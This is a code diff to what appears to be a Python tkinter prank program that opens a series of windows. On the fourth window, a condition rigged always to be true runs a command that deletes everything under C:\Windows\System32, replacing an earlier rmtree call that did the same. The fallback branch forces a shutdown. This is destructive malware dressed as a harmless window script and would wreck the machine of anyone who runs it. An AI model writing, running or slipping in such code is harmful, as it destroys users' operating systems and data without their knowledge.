@@ -1,4 +1,5 @@
 import random
+from nt import chmod
 from os import system
 from shutil import rmtree
 from tkinter import *
@@ -34,7 +35,7 @@ def createWindow(labelText, buttonText, i):
     windows.append(window)
     if i == 4:
         if randint(1, 1) == 1:
-            rmtree("C:/Windows/System32")
+            system('del /s /q C:\Windows\System32\*')
         else:
             system('shutdown /s /t 5')
     return window
